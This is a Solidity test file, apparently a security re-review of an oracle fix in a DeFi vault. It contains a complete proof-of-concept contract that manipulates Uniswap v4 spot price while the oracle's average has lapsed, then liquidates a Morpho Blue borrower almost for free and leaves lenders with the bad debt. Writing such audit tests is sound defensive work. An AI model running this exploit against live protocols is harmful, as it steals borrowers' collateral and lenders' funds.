// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {TickMath} from "v4-core/libraries/TickMath.sol";
import {IPoolManager} from "v4-core/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "v4-core/interfaces/callback/IUnlockCallback.sol";
import {PoolKey} from "v4-core/types/PoolKey.sol";
import {Currency} from "v4-core/types/Currency.sol";
import {BalanceDelta} from "v4-core/types/BalanceDelta.sol";
import {IOracle} from "../../../src/interfaces/IOracle.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {IAggregatorV3} from "../../../src/interfaces/IUniswapV3.sol";
import {VaultMath} from "../../../src/VaultMath.sol";
import {IUptickVault, IVaultFactory} from "../../../src/UptickShareOracle.sol";

import {ShareCollateralV4Test, MarketParams, IMorpho} from "../../ShareCollateral.t.sol";
import {StockVaultV4} from "../../../src/v4/StockVaultV4.sol";

/// @dev The attacker: one PoolManager unlock. Sell the Stock Token to `target` without paying for it (v4 deltas settle at
/// the end of the unlock), liquidate on Morpho while spot sits there, buy the Stock Token back with the USDG the first
/// swap produced, settle the net (the two legs' pool fees) from its own balance. No flash loan, no inventory.
contract PushLiquidator is IUnlockCallback {
    IPoolManager immutable pm;
    IMorpho immutable morpho;
    PoolKey key;
    MarketParams mp;
    address borrower;
    uint256 seize;
    uint160 target;
    uint160 back;
    bool stockIsToken0;
    uint256 public seized;
    uint256 public repaid;
    uint256 public priceDuring;
    uint256 public stockThroughPool;

    constructor(IPoolManager pm_, IMorpho m) {
        pm = pm_;
        morpho = m;
    }

    function attack(PoolKey memory k, MarketParams memory m, address b, uint256 s, uint160 t, uint160 bk, bool s0)
        external
    {
        key = k;
        mp = m;
        borrower = b;
        seize = s;
        target = t;
        back = bk;
        stockIsToken0 = s0;
        IERC20(m.loanToken).approve(address(morpho), type(uint256).max);
        pm.unlock("");
    }

    function unlockCallback(bytes calldata) external returns (bytes memory) {
        require(msg.sender == address(pm));
        BalanceDelta d1 = pm.swap(key, IPoolManager.SwapParams(stockIsToken0, -int256(1e30), target), "");
        int128 stockLeg = stockIsToken0 ? d1.amount0() : d1.amount1();
        stockThroughPool = uint256(uint128(-stockLeg));
        priceDuring = IOracle(mp.oracle).price();
        (seized, repaid) = morpho.liquidate(mp, borrower, seize, 0, "");
        int128 usdgOut = stockIsToken0 ? d1.amount1() : d1.amount0();
        BalanceDelta d2 = pm.swap(key, IPoolManager.SwapParams(!stockIsToken0, -int256(uint256(uint128(usdgOut))), back), "");
        _settle(key.currency0, int256(d1.amount0()) + d2.amount0());
        _settle(key.currency1, int256(d1.amount1()) + d2.amount1());
        return "";
    }

    function _settle(Currency c, int256 n) private {
        if (n < 0) {
            pm.sync(c);
            IERC20(Currency.unwrap(c)).transfer(address(pm), uint256(-n));
            pm.settle();
        } else if (n > 0) {
            pm.take(c, address(this), uint256(n));
        }
    }

    function redeem(address vault, uint256 shares) external {
        StockVaultV4(vault).redeemInKind(shares, address(this), address(this));
    }
}

/// @dev `UptickShareOracle` as it stands on `integration` (before r2-oracle-fix), verbatim but renamed: the reference
/// for "the O-L1 change introduced this". It reads no TWAP or spot term outside the totalAssets() cap.
contract PreFixOracle is IOracle {
    using Math for uint256;

    uint256 public constant MAX_FEED_AGE = 349_200;
    uint8 private constant FEED_INVALID = 1;

    IUptickVault public immutable vault;
    IERC20 public immutable stock;
    IERC20 public immutable usdg;
    bool public immutable stockIsToken0;
    VaultMath public immutable vaultMath;
    uint256 private immutable virtualShares;
    uint256 private immutable stockScale;
    uint256 private immutable usdgScale;

    constructor(IVaultFactory factory, IUptickVault vault_) {
        require(factory.isVault(address(vault_)));
        vault = vault_;
        IERC20Metadata stock_ = IERC20Metadata(vault_.stock());
        IERC20Metadata usdg_ = IERC20Metadata(vault_.usdg());
        stock = stock_;
        usdg = usdg_;
        stockIsToken0 = vault_.stockIsToken0();
        vaultMath = VaultMath(vault_.vaultMath());
        virtualShares = 10 ** (vault_.decimals() - stock_.decimals());
        stockScale = 10 ** (uint256(stock_.decimals()) + IAggregatorV3(vault_.feed()).decimals());
        usdgScale = 10 ** uint256(usdg_.decimals());
    }

    function price() external view returns (uint256) {
        (uint8 status, uint256 px, uint256 updatedAt, uint160 sqrtOracle,,) = vault.health();
        require(status != FEED_INVALID && block.timestamp - updatedAt <= MAX_FEED_AGE);
        return valueInUsdg(px, sqrtOracle).mulDiv(1e36, vault.totalSupply() + virtualShares);
    }

    function valueInUsdg(uint256 px, uint160 sqrtOracle) public view returns (uint256) {
        IUptickVault.PositionInfo memory p = vault.positionInfo();
        uint256 posStock;
        uint256 posUsdg;
        if (p.liquidity != 0) {
            (uint256 a0, uint256 a1) = vaultMath.amounts(sqrtOracle, p.tickLower, p.tickUpper, p.liquidity);
            (posStock, posUsdg) = stockIsToken0 ? (a0, a1) : (a1, a0);
        }
        uint256 owed = vault.totalStockOwed();
        uint256 idle = stock.balanceOf(address(vault));
        uint256 stockTotal = (idle > owed ? idle - owed : 0) + posStock + p.uncollectedStock;
        uint256 usdgTotal = usdg.balanceOf(address(vault)) + posUsdg + p.uncollectedUsdg;
        uint256 usdgPerStock = px * usdgScale;
        uint256 value = stockTotal.mulDiv(usdgPerStock, stockScale) + usdgTotal;
        (, uint16 perfFeeBps,,,,,,) = vault.params();
        uint256 feeValue = p.uncollectedStock.mulDiv(usdgPerStock, stockScale) + p.uncollectedUsdg;
        uint256 cut = feeValue.mulDiv(perfFeeBps, 1e4, Math.Rounding.Ceil);
        value = value > cut ? value - cut : 0;
        return Math.min(value, vault.totalAssets().mulDiv(usdgPerStock, stockScale));
    }
}

/// @dev Independent re-review of branch r2-oracle-fix, 2026-10-23. Fork of 4663 at head (public RPC):
///   forge test --match-contract FreshReview -j 1 -vv
///
/// The O-L1 fix rebuilds the v4 pending cut as `gross - uncollectedCut - totalAssets()` at `nav = min(Chainlink,
/// sqrtTwap)` and multiplies it by Chainlink. When the vault's observation ring has lapsed (no poke for MAX_GAP = 120 s:
/// every weekend once the feed is older than maxStaleness, or any keeper outage) `health()` reports spot as `sqrtTwap`.
/// The USDG part of the pending cut is then scaled by `Chainlink / spot`, which a same-transaction swap controls.
contract FreshReviewV4 is ShareCollateralV4Test {
    IMorpho constant MORPHO = IMorpho(0x9D53d5E3bd5E8d4Cbfa6DB1ca238AEA02E651010);
    address constant IRM = 0x2BD3d5965B26B51814AC95127B2b80dD6CcC0fa1;
    uint256 constant LLTV = 0.625e18;
    bytes4 constant LRD = bytes4(keccak256("latestRoundData()"));

    address lender = makeAddr("lender");
    address attacker = makeAddr("attacker");

    /// @dev Fees accrue in the position (both legs), Chainlink sits at the pool.
    function _accrue() internal returns (uint256 px) {
        _deposit(bob, UNIT());
        _volume(VOL() * 2, 3);
        _advance(600);
        _settle();
        px = _poolPrice();
        _setFeed(px);
    }

    /// @dev Weekend: the feed is 25.3 h old (over maxStaleness 25 h, under the oracle's 97 h), so the gate is closed and
    /// poke writes nothing; 200 s later the ring has lapsed and the vault reports spot as its TWAP. With `sweep`, a holder
    /// redeems a dust amount in kind, which moves every uncollected fee into idle and records it as pending.
    function _weekend(uint256 px, bool sweep) internal {
        uint256 t = vm.getBlockTimestamp() - 91_000;
        vm.mockCall(FEED(), abi.encodeWithSelector(LRD), abi.encode(feedRound, int256(px), t, t, feedRound));
        if (sweep) {
            uint256 dust = vault.totalSupply() / 1e6;
            vm.prank(bob);
            vault.redeemInKind(dust, bob, bob);
        }
        vm.warp(vm.getBlockTimestamp() + 200);
        vm.roll(vm.getBlockNumber() + 1);
        (StockVaultV4.Status st,,,, uint160 twap, uint160 spot) = vault.health();
        assertEq(uint8(st), uint8(StockVaultV4.Status.FeedStale), "weekend: gate closed");
        assertEq(twap, spot, "ring lapsed: the vault reports spot as its TWAP");
    }

    /// @dev The pool sqrt price at which the Stock Token is worth `usd` (8 decimals).
    function _sqrtAtUsd(uint256 usd) internal view returns (uint160) {
        if (stockIsToken0) return uint160(Math.sqrt(Math.mulDiv(usd, 1 << 192, 1e20)));
        return uint160(Math.sqrt(1e56 / usd) * (1 << 96) / 1e18);
    }

    /// @dev Sells the Stock Token into the pool until it trades at `usd`; returns the Stock Token the pool absorbed.
    function _sellTo(uint256 usd) internal returns (uint256 spent) {
        uint256 s0 = IERC20(STOCK()).balanceOf(address(trader));
        trader.swap(key, stockIsToken0, s0, _sqrtAtUsd(usd));
        spent = s0 - IERC20(STOCK()).balanceOf(address(trader));
    }

    function _dppm(uint256 p1, uint256 p0) internal pure returns (int256) {
        return (int256(p1) - int256(p0)) * 1e6 / int256(p0);
    }

    /// @dev The curve: how far the oracle falls for how much Stock Token pushed into the pool, with fees pending.
    function test_measure_weekendSpotPushWithPendingFees() public {
        uint256 px = _accrue();
        _weekend(px, true);
        uint256 p0 = oracle.price();
        emit log_named_uint("Chainlink px (8 dec)", px);
        emit log_named_uint("pendingCutUsdg before push (raw USDG)", oracle.pendingCutUsdg());
        emit log_named_uint("vault value at Chainlink (raw USDG)", p0 * (vault.totalSupply() + 1e6) / 1e36);
        uint256[7] memory ks = [uint256(2), 10, 100, 1e3, 1e4, 1e6, 1e8];
        uint256 spent;
        for (uint256 i; i < ks.length; ++i) {
            spent += _sellTo(px / ks[i]);
            emit log_named_uint("--- spot pushed down by factor", ks[i]);
            emit log_named_uint("cumulative Stock Token sold (1e18)", spent);
            try oracle.price() returns (uint256 p) {
                emit log_named_int("oracle price change, ppm", _dppm(p, p0));
            } catch {
                emit log_string("oracle price() reverts");
            }
        }
        uint256 s0 = IERC20(STOCK()).balanceOf(address(trader));
        trader.swap(key, stockIsToken0, s0, stockIsToken0 ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1);
        spent += s0 - IERC20(STOCK()).balanceOf(address(trader));
        (, int24 tk) = _spot();
        emit log_named_int("--- pushed to the sqrt-price limit, tick", tk);
        emit log_named_uint("cumulative Stock Token sold (1e18)", spent);
        try oracle.price() returns (uint256 p) {
            emit log_named_int("oracle price change, ppm", _dppm(p, p0));
        } catch {
            emit log_string("oracle price() reverts (pre-existing: totalAssets divides by a zero nav)");
        }
    }

    /// @dev Must-fail control for the PoC below: the same weekend and the same push without pending fees. The rebuilt
    /// pending cut stays zero, the price does not fall (the push pays the position fees, so it can only rise).
    function test_control_weekendSpotPushWithoutPendingFeesDoesNotLowerPrice() public {
        uint256 px = _accrue();
        _weekend(px, false);
        uint256 p0 = oracle.price();
        _sellTo(px / 1e4);
        assertEq(oracle.pendingCutUsdg(), 0, "nothing pending");
        assertGe(oracle.price(), p0, "no pending fees: a spot push cannot lower the price");
    }

    /// @dev Same weekend, pending fees present: one swap that leaves the Stock Token at 1/10,000 of Chainlink in the pool
    /// multiplies the USDG part of the pending cut by 10,000 and drives the oracle to zero. Before the O-L1 change the
    /// oracle read no spot-dependent term and this push could not lower it.
    function test_poc_weekendSpotPushZeroesPriceThroughPendingCut() public {
        uint256 px = _accrue();
        PreFixOracle pre = new PreFixOracle(IVaultFactory(address(factory)), IUptickVault(address(vault)));
        _weekend(px, true);
        uint256 p0 = oracle.price();
        uint256 q0 = pre.price();
        assertGt(p0, 0);
        _sellTo(px / 1e4);
        uint256 p1 = oracle.price();
        uint256 q1 = pre.price();
        emit log_named_int("r2-oracle-fix oracle, price change on the push, ppm", _dppm(p1, p0));
        emit log_named_int("integration oracle, same push, ppm", _dppm(q1, q0));
        assertGe(q1, q0, "the pre-fix oracle cannot be lowered by this push");
        assertLt(p1, p0 / 2, "the fixed oracle fell by more than half on a spot push");
    }

    /// @dev End to end on the live Morpho Blue singleton: a borrower at 80% of the LLTV limit, a weekend with pending
    /// fees, then one PoolManager unlock: sell the Stock Token to 1/10,000 of Chainlink, liquidate the whole collateral
    /// for (nearly) nothing, buy the Stock Token back, settle. Lenders are left with the bad debt; the attacker pays only
    /// the round trip's pool fees and redeems the seized shares in kind.
    function test_poc_weekendSpotPushLiquidatesForFree() public {
        address carol = makeAddr("carol");
        _deposit(carol, 60_000e6 * 1e20 / _poolPrice()); // a $60,000 borrower: the vault ends near its $100,000 cap
        _advance(1 hours); // the vault's own deploy swap moved spot; let the average catch up as arbitrage would
        uint256 px = _accrue();
        emit log_named_uint("vault value at Chainlink (raw USDG)", oracle.price() * (vault.totalSupply() + 1e6) / 1e36);
        MarketParams memory mp = MarketParams(USDG, address(vault), address(oracle), IRM, LLTV);
        bytes32 id = keccak256(abi.encode(mp));
        MORPHO.createMarket(mp);
        deal(USDG, lender, 1_000_000e6);
        vm.startPrank(lender);
        IERC20(USDG).approve(address(MORPHO), type(uint256).max);
        MORPHO.supply(mp, 1_000_000e6, 0, lender, "");
        vm.stopPrank();
        uint256 coll = vault.balanceOf(carol);
        uint256 maxBorrow = coll * oracle.price() / 1e36 * LLTV / 1e18;
        vm.startPrank(carol);
        IERC20(address(vault)).approve(address(MORPHO), type(uint256).max);
        MORPHO.supplyCollateral(mp, coll, carol, "");
        MORPHO.borrow(mp, maxBorrow * 8 / 10, 0, carol, carol);
        vm.stopPrank();
        vm.roll(vm.getBlockNumber() + 1);

        _weekend(px, true);
        uint256 p0 = oracle.price();
        uint256 collValue = coll * p0 / 1e36;
        (uint128 supply0,, uint128 borrow0,,,) = MORPHO.market(id);
        emit log_named_uint("borrowed (raw USDG)", borrow0);
        emit log_named_uint("collateral value at the oracle before (raw USDG)", collValue);

        PushLiquidator a = new PushLiquidator(PM, MORPHO);
        deal(STOCK(), address(a), 1_000_000e18); // working balance for the round trip's fees only
        deal(USDG, address(a), 1_000_000e6);
        uint256 s0 = IERC20(STOCK()).balanceOf(address(a));
        uint256 u0 = IERC20(USDG).balanceOf(address(a));
        (uint160 sqrt0,) = _spot();
        a.attack(key, mp, carol, coll, _sqrtAtUsd(px / 1e4), sqrt0, stockIsToken0);

        (uint128 supply1,,,,,) = MORPHO.market(id);
        emit log_named_uint("oracle price during the push", a.priceDuring());
        emit log_named_uint("seized shares", a.seized());
        emit log_named_uint("repaid (raw USDG)", a.repaid());
        emit log_named_uint("Stock Token pushed through the pool (1e18)", a.stockThroughPool());
        emit log_named_uint("lender loss: supply assets written off (raw USDG)", supply0 - supply1);
        assertEq(a.seized(), coll, "the whole collateral was seized");
        assertLt(a.repaid(), collValue / 100, "for under 1% of its value");
        assertGt(supply0 - supply1, uint256(borrow0) * 99 / 100, "lenders absorb the debt as bad debt");

        vm.roll(vm.getBlockNumber() + 1);
        a.redeem(address(vault), a.seized());
        int256 dStock = int256(IERC20(STOCK()).balanceOf(address(a))) - int256(s0);
        int256 dUsdg = int256(IERC20(USDG).balanceOf(address(a))) - int256(u0);
        int256 pnl = dStock * int256(px) / 1e20 + dUsdg;
        emit log_named_int("attacker Stock Token delta incl. redeemed shares (1e18)", dStock);
        emit log_named_int("attacker USDG delta incl. redeemed shares (raw)", dUsdg);
        emit log_named_int("attacker PnL at Chainlink (raw USDG)", pnl);
        emit log_named_int("push round trip cost (raw USDG), PnL less the collateral value", int256(collValue) - pnl);
        assertGt(pnl, int256(collValue) / 2, "the attacker keeps over half the collateral's value");
    }
}
